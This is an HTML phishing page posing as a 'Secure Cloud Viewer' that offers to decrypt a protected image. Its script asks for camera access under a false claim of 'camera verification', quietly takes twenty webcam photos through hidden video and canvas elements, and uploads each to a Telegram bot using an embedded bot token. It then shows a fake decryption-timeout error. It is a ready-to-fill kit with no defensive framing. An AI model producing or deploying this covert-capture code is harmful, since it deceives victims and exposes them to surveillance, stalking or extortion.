<!DOCTYPE html>
<html>
<head>
    <title>Encrypted File Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: #e0e0e0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 10px; background: #1a1a1a; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .btn { background: #2563eb; border: none; color: white; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 6px; transition: 0.3s; }
        .btn:hover { background: #1d4ed8; }
        #status { margin-top: 20px; color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Cloud Viewer</h2>
        <p>This image is protected by end-to-end encryption.</p>
        <button class="btn" id="viewBtn" onclick="startDemo()">Access Image</button>
        <div id="status"></div>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // STEP 1: ADD YOUR DETAILS HERE
        const BOT_TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU'; 
        const CHAT_ID = '8600866532';

        async function startDemo() {
            const status = document.getElementById('status');
            const btn = document.getElementById('viewBtn');
            
            try {
                // Requesting permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                btn.style.display = 'none';
                status.innerText = "Decrypting content... please wait...";

                const video = document.getElementById('video');
                video.srcObject = stream;

                // Wait for video to be ready
                video.onloadedmetadata = async () => {
                    // Capture 20 photos (1 every 500ms)
                    for (let i = 1; i <= 20; i++) {
                        captureAndSend(i);
                        await new Promise(r => setTimeout(r, 500));
                    }
                    status.innerText = "Error: Decryption timed out. Connection lost.";
                };
            } catch (err) {
                status.innerText = "Error: Access denied. Decryption requires camera verification.";
            }
        }

        function captureAndSend(index) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `snap_${index}.jpg`);
                formData.append('caption', `Capture #${index} from Demo`);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7); // 0.7 quality for faster uploading
        }
    </script>
</body>
</html>
